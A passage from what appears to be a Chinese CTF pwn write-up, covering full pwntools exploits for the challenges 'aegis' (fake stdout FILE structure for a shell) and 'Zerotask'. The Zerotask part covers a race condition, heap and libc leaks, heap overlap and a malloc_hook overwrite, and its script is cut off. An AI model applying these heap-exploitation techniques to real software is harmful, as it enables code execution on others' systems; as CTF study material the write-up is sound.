class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">_IO_USE_OLD_IO_FILE = <span class="literal">False</span></span><br><span class="line">_BITS = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_u64</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">"&lt;Q"</span>,data)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_u32</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">"&lt;I"</span>,data)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_u16</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">"&lt;H"</span>,data)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_u8</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> ord(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_usz</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> _BITS == <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> _u32(data)</span><br><span class="line">    <span class="keyword">elif</span> _BITS == <span class="number">64</span>:</span><br><span class="line">        <span class="keyword">return</span> _u64(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] Invalid _BITS"</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_ua</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> _BITS == <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> _u32(data)</span><br><span class="line">    <span class="keyword">elif</span> _BITS == <span class="number">64</span>:</span><br><span class="line">        <span class="keyword">return</span> _u64(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] Invalid _BITS"</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_p64</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"&lt;Q"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_p32</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_p16</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"&lt;H"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_p8</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> chr(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_psz</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> _BITS == <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> _p32(data)</span><br><span class="line">    <span class="keyword">elif</span> _BITS == <span class="number">64</span>:</span><br><span class="line">        <span class="keyword">return</span> _p64(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] Invalid _BITS"</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_pa</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> _BITS == <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>, data)</span><br><span class="line">    <span class="keyword">elif</span> _BITS == <span class="number">64</span>:</span><br><span class="line">        <span class="keyword">return</span> struct.pack(<span class="string">"&lt;Q"</span>, data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] Invalid _BITS"</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_IO_FILE_plus</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self._flags = <span class="number">0xfbad2800</span>      <span class="comment"># High-order word is _IO_MAGIC; rest is flags.</span></span><br><span class="line">        self._IO_read_ptr = libc_addr<span class="number">-0x7ffff6e03000</span>+<span class="number">0x7ffff71ef7e3</span>   <span class="comment"># Current read pointer</span></span><br><span class="line">        self._IO_read_end = libc_addr<span class="number">-0x7ffff6e03000</span>+<span class="number">0x7ffff71ef7e3</span><span class="comment"># End of get area</span></span><br><span class="line">        self._IO_read_base = libc_addr<span class="number">-0x7ffff6e03000</span>+<span class="number">0x7ffff71ef7e3</span>  <span class="comment"># Start of putback+get area</span></span><br><span class="line">        self._IO_write_base =libc_addr<span class="number">-0x7ffff6e03000</span>+<span class="number">0x7ffff71ef7e3</span> <span class="comment"># Start of put area</span></span><br><span class="line">        self._IO_write_ptr = libc_addr<span class="number">-0x7ffff6e03000</span>+<span class="number">0x7ffff71ef7e3</span>  <span class="comment"># Current put pointer</span></span><br><span class="line">        self._IO_write_end = libc_addr<span class="number">-0x7ffff6e03000</span>+<span class="number">0x7ffff71ef7e3</span>  <span class="comment"># End of put area</span></span><br><span class="line">        self._IO_buf_base = bin_sh_addr   <span class="comment"># Start of reserve area</span></span><br><span class="line">        self._IO_buf_end = libc_addr<span class="number">-0x7ffff6e03000</span>+<span class="number">0x7ffff71ef7e3</span>+<span class="number">1</span>   <span class="comment"># End of reserve area</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># The following fields are used to support backing up and undo.</span></span><br><span class="line">        self._IO_save_base = <span class="number">0</span>      <span class="comment"># Pointer to start of non-current get area</span></span><br><span class="line">        self._IO_backup_base = <span class="number">0</span>    <span class="comment"># Pointer to first valid character of backup area</span></span><br><span class="line">        self._IO_save_end = <span class="number">0</span>       <span class="comment"># Pointer to end of non-current get area</span></span><br><span class="line"></span><br><span class="line">        self._markers = <span class="number">0</span></span><br><span class="line">        self._chain = libc_addr<span class="number">-0x7ffff6e03000</span>+<span class="number">0x7ffff71eea00</span></span><br><span class="line"></span><br><span class="line">        self._fileno = <span class="number">1</span></span><br><span class="line">        self._flags2 = <span class="number">0</span></span><br><span class="line">        self._old_offset = <span class="number">0xffffffffffffffff</span>    <span class="comment"># This used to be _offset but it's too small</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1+column number of pbase(); 0 is unknown</span></span><br><span class="line">        self._cur_column = <span class="number">0</span></span><br><span class="line">        self._vtable_offset = <span class="number">0</span></span><br><span class="line">        self._shortbuf = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        self._lock = libc_addr<span class="number">-0x7ffff6e03000</span>+<span class="number">0x7ffff71f08c0</span> </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> _IO_USE_OLD_IO_FILE:</span><br><span class="line">            self._offset = <span class="number">0xffffffffffffffff</span></span><br><span class="line">            self._codecvt = <span class="number">0</span></span><br><span class="line">            self._wide_data =libc_addr<span class="number">-0x7ffff6e03000</span>+<span class="number">0x7ffff71ee8c0</span></span><br><span class="line">            self._freeres_list = <span class="number">0</span></span><br><span class="line">            self._freeres_buf = <span class="number">0</span></span><br><span class="line">            self.__pad5 = <span class="number">0</span></span><br><span class="line">            self._mode = <span class="number">0xffffffff</span></span><br><span class="line">            self._unused2 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span> * <span class="number">4</span> - <span class="number">5</span> * _BITS / <span class="number">8</span>)]</span><br><span class="line">        self.vtable = libc_addr+<span class="number">0x3e7fa0</span><span class="number">-0x28</span> <span class="comment">#_IO_strn_jumps-&gt;_IO_str_finish</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tostr</span><span class="params">(self)</span>:</span></span><br><span class="line">        buf = _p64(self._flags &amp; <span class="number">0xffffffff</span>) + \</span><br><span class="line">            _pa(self._IO_read_ptr) + \</span><br><span class="line">            _pa(self._IO_read_end) + \</span><br><span class="line">            _pa(self._IO_read_base) + \</span><br><span class="line">            _pa(self._IO_write_base) + \</span><br><span class="line">            _pa(self._IO_write_ptr) + \</span><br><span class="line">            _pa(self._IO_write_end) + \</span><br><span class="line">            _pa(self._IO_buf_base) + \</span><br><span class="line">            _pa(self._IO_buf_end) + \</span><br><span class="line">            _pa(self._IO_save_base) + \</span><br><span class="line">            _pa(self._IO_backup_base) + \</span><br><span class="line">            _pa(self._IO_save_end) + \</span><br><span class="line">            _pa(self._markers) + \</span><br><span class="line">            _pa(self._chain) + \</span><br><span class="line">            _p32(self._fileno) + \</span><br><span class="line">            _p32(self._flags2) + \</span><br><span class="line">            _p64(self._old_offset) + \</span><br><span class="line">            _p16(self._cur_column) + \</span><br><span class="line">            _p8(self._vtable_offset) + \</span><br><span class="line">            _p8(self._shortbuf)</span><br><span class="line">        <span class="keyword">if</span> _BITS == <span class="number">64</span>:</span><br><span class="line">            buf += _p32(<span class="number">0</span>)</span><br><span class="line">        buf += _pa(self._lock)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> _IO_USE_OLD_IO_FILE:</span><br><span class="line">            buf += \</span><br><span class="line">            _p64(self._offset) + \</span><br><span class="line">            _pa(self._codecvt) + \</span><br><span class="line">            _pa(self._wide_data) + \</span><br><span class="line">            _pa(self._freeres_list) + \</span><br><span class="line">            _pa(self._freeres_buf) + \</span><br><span class="line">            _psz(self.__pad5) + \</span><br><span class="line">            _p32(self._mode) + \</span><br><span class="line">            <span class="string">''</span>.join(map(<span class="keyword">lambda</span> x:_p8(x), self._unused2)) +\</span><br><span class="line">            _pa(self.vtable)</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.tostr()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,note,ID)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">"Choice: "</span>,<span class="string">"1"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"Size: "</span>,str(size))</span><br><span class="line">   p.sendafter(<span class="string">"Content: "</span>,note)</span><br><span class="line">   p.sendlineafter(<span class="string">"ID: "</span>,str(ID))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">"Choice: "</span>,<span class="string">"2"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"Index: "</span>,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">"Choice: "</span>,<span class="string">"4"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"Index: "</span>,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(index,note,ID)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">"Choice: "</span>,<span class="string">"3"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"Index: "</span>,str(index))</span><br><span class="line">   p.sendafter(<span class="string">"Content: "</span>,note)</span><br><span class="line">   p.sendlineafter(<span class="string">"ID: "</span>,str(ID))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret</span><span class="params">(num)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">"Choice: "</span>,<span class="string">"666"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"Number: "</span>,str(num))</span><br><span class="line">p=process(<span class="string">"./aegis"</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="number">0xffffffffffffff</span>)</span><br><span class="line">update(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">15</span>,<span class="number">0xffffffffffffff</span>)</span><br><span class="line">secret(<span class="number">0x0c047fff8004</span>)</span><br><span class="line">update(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+<span class="string">"\x02\xff\xff"</span>+<span class="string">"\n"</span>, <span class="number">0x1000000002ffffff</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0x602000000018</span>)[:<span class="number">7</span>]+<span class="string">"\n"</span>,<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">exec_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="number">-0x114ab0</span></span><br><span class="line"><span class="keyword">print</span> hex(exec_addr)</span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">puts_ptr=exec_addr+<span class="number">0x347e28</span></span><br><span class="line">update(<span class="number">1</span>,<span class="string">"aa"</span>,<span class="number">-1</span>)</span><br><span class="line">update(<span class="number">1</span>,p64(puts_ptr)[:<span class="number">7</span>]+<span class="string">"\n"</span>,<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">libc_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="number">-0x809c0</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line"><span class="comment">#write stdout</span></span><br><span class="line">bin_sh_addr=libc_addr+<span class="number">0x1b3e9a</span></span><br><span class="line">payload=_IO_FILE_plus().tostr()+p64(<span class="number">0</span>)+p64(libc_addr+<span class="number">0x4f440</span>)</span><br><span class="line">add(<span class="number">0x100</span>,payload+<span class="string">"\n"</span>,<span class="number">0</span>)</span><br><span class="line">fake_stdout=<span class="number">0x611000000040</span></span><br><span class="line">stdout_addr=libc_addr+<span class="number">0x3ec848</span></span><br><span class="line">update(<span class="number">1</span>,<span class="string">"a"</span>*<span class="number">7</span>,<span class="number">-1</span>)</span><br><span class="line">update(<span class="number">1</span>,p64(stdout_addr)[:<span class="number">7</span>]+<span class="string">"\n"</span>,exec_addr+<span class="number">0x114ab0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">"Choice: "</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index: "</span>,<span class="string">"0"</span>)</span><br><span class="line">p.sendafter(<span class="string">"Content: "</span>,p64(fake_stdout))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Zerotask"><a href="#Zerotask" class="headerlink" title="Zerotask"></a>Zerotask</h2><h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><p>程序提供三个功能：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add：添加一个结构体并指明aes加密&#x2F;解密</span><br><span class="line">delete：清除指定task id的结构体</span><br><span class="line">go：根据指定结构体的信息加解密&lt;&#x2F;pre&gt;</span><br></pre></td></tr></table></figure>
<p>结构体通过链表在堆中存储<br>内部结构：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0-&gt;note_ptr</span><br><span class="line">0x8-&gt;size</span><br><span class="line">0x10-&gt;mode</span><br><span class="line">0x14-&gt;size</span><br><span class="line">0x34-&gt;IV</span><br><span class="line">0x58-&gt;ctx_ptr</span><br><span class="line">0x60-&gt;task_id</span><br><span class="line">0x68-&gt;pre_struct</span><br></pre></td></tr></table></figure>
<p>在go的过程中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Task id : "</span>);</span><br><span class="line">  v1 = sub_1011();</span><br><span class="line">  <span class="keyword">for</span> ( arg = (<span class="keyword">void</span> *)qword_202028; arg; arg = (<span class="keyword">void</span> *)*((_QWORD *)arg + <span class="number">13</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == *((_DWORD *)arg + <span class="number">24</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      pthread_create(&amp;newthread, <span class="number">0L</span>L, start_routine, arg);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>调用一个新线程处理指定的结构体<br>跟进start_routine：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">v2 = (<span class="keyword">unsigned</span> __int64)a1;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0L</span>L;</span><br><span class="line">  v4 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Prepare..."</span>);</span><br><span class="line">  sleep(<span class="number">2u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(qword_202030, <span class="number">0</span>, <span class="number">0x1010</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)EVP_CipherUpdate(</span><br><span class="line">                        *(_QWORD *)(v2 + <span class="number">88</span>),</span><br><span class="line">                        qword_202030,</span><br><span class="line">                        &amp;v1,</span><br><span class="line">                        *(_QWORD *)v2,</span><br><span class="line">                        (<span class="keyword">unsigned</span> <span class="keyword">int</span>)*(_QWORD *)(v2 + <span class="number">8</span>)) )</span><br><span class="line">    pthread_exit(<span class="number">0L</span>L);</span><br><span class="line">  *((_QWORD *)&amp;v2 + <span class="number">1</span>) += v1;</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)EVP_CipherFinal_ex(*(_QWORD *)(v2 + <span class="number">88</span>), (<span class="keyword">char</span> *)qword_202030 + *((_QWORD *)&amp;v2 + <span class="number">1</span>), &amp;v1) )</span><br><span class="line">    pthread_exit(<span class="number">0L</span>L);</span><br><span class="line">  *((_QWORD *)&amp;v2 + <span class="number">1</span>) += v1;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Ciphertext: "</span>);</span><br><span class="line">  sub_107B(<span class="built_in">stdout</span>, qword_202030, *((_QWORD *)&amp;v2 + <span class="number">1</span>), <span class="number">16L</span>L, <span class="number">1L</span>L);</span><br><span class="line">  pthread_exit(<span class="number">0L</span>L)</span><br></pre></td></tr></table></figure>
<p>其首先获得需要处理的结构体指针，而后会sleep(2)<strong>（条件竞争）</strong><br>因此我们可以在sleep时改写此结构体所在chunk，使其处理我们构造的fake_chunk<br>因为go操作的三次限制，所以我的思路：<br><strong>leak heap：首先go启动，在sleep过程中进行free chunk等操作，用以获得目标地址因为free产生的堆指针<br>leak libc:首先构造一个unsorted bin，用以获得指向main arena+88处的指针，而后堆地址已知，利用leak heap相同方法伪造将要处理的chunk即可leak main_arena,即可leak libc<br>heap overflow：在加解密过程中，程序使用最开始分配的一个0x1010大小的chunk作存储，但是加解密时数据的长度由处理的结构体中的size决定，因此我们可以伪造一个结构体，其中encrypt_code_size大于0x1010，并且指向我们在内存中构造的一串数据，此数据code需要满足<br>aes_cbc_encrypt(code)=_the_answer_we_want,具体构造过程可以参照cbc模式下加密的特点：</strong><br><img src="https://upload-images.jianshu.io/upload_images/7434375-15604aa85907073a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="CBC"></p>
<p><strong>构造方法参考我之前的文章：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;kirin-say.top&#x2F;2019&#x2F;01&#x2F;15&#x2F;EDU%20CTF%202019&#x2F;#0x02-encrypted-secret</span><br></pre></td></tr></table></figure>
<p><strong>最后选择利用溢出覆盖下一个chunk的size位为0x320，这时候free掉此chunk，此chunk下就会包含另一个0x80大小的chunk造成堆重叠，此时我们申请一个0x318大小的chunk改写包含的0x80的chunk的fd指针到malloc_hook，而后申请一个0x78大小的note，此note即会分配到malloc_hook,覆盖其为one_gadget，再次malloc即可get_shell</strong></p>
<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    s=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        s+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(message)</span>:</span></span><br><span class="line">    kirin=AES.new(key1,AES.MODE_CBC,key2)</span><br><span class="line">    <span class="keyword">return</span> kirin.encrypt(message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(message)</span>:</span></span><br><span class="line">    kirin=AES.new(key1,AES.MODE_CBC,key2)</span><br><span class="line">    <span class="keyword">return</span> kirin.decrypt(message)    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt2</span><span class="params">(message)</span>:</span></span><br><span class="line">    kirin=AES.new(key1,AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> kirin.encrypt(message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt2</span><span class="params">(message)</span>:</span></span><br><span class="line">    kirin=AES.new(key1,AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> kirin.decrypt(message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(ID,mode,key,IV,dsize,note,go=False)</span>:</span></span><br><span class="line">   <span class="keyword">if</span>  go:</span><br><span class="line">       p.sendline(<span class="string">"1"</span>)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       p.sendlineafter(<span class="string">"Choice: "</span>,<span class="string">"1"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"Task id : "</span>,str(ID))</span><br><span class="line">   p.sendlineafter(<span 